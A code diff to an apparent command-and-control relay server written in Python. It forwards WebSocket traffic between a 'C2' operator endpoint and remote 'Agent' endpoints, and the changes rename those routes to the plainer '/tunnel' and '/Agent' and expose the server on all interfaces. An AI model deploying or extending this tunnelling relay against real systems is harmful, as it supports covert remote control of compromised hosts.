@@ -128,6 +128,7 @@ async def PortTunnelAgent(req : web.Request):
 
 
 async def PortTunnelC2(req : web.Request):
+    print('C2 Connected')
     ws_handler = web.WebSocketResponse()
     await ws_handler.prepare(req)
     myUUID = req.query.get('uid','')
@@ -140,7 +141,7 @@ async def PortTunnelC2(req : web.Request):
         try:
             
             
-
+            
 
             async for msg in ws_handler:
 
@@ -152,21 +153,31 @@ async def PortTunnelC2(req : web.Request):
                     if Agent is not None and not Agent.closed:
                         await Agent.send_bytes(msg.data)
 
-                if msg.type == web.WSMsgType.TEXT:
+                elif msg.type == web.WSMsgType.TEXT:
                     
 
                     if Agent is not None and not Agent.closed:
                         await Agent.send_str(msg.data)
+
+                
+                
+                
                 
                 if msg.type == web.WSMsgType.ERROR:
+                    print("Error C2")
                     break
                     
 
         finally:
             if myUUID in ws_manager.ws_connection_list:
                 del ws_manager.ws_connection_list[myUUID]
+            if Agent is not None and not Agent.closed:
+                await Agent.send_bytes(bytes.fromhex('efbeadde0000000000000a0000000000'))
             
+    print('C2 DisConnected')
 
+    
+    
     return ws_handler
 
 
@@ -178,8 +189,8 @@ async def ListAgent(req : web.Request):
 #----------------------------------------------------------------------------
 
 web_app.router.add_get('/Ls',ListAgent)
-web_app.router.add_get('/PTnlWsC2',PortTunnelC2)
-web_app.router.add_get('/PTnlWsAgent',PortTunnelAgent)
+web_app.router.add_get('/tunnel',PortTunnelC2)
+web_app.router.add_get('/Agent',PortTunnelAgent)
 
 if __name__ == '__main__':
-    web.run_app(web_app,port=80)
+    web.run_app(web_app,host='0.0.0.0',port=80)
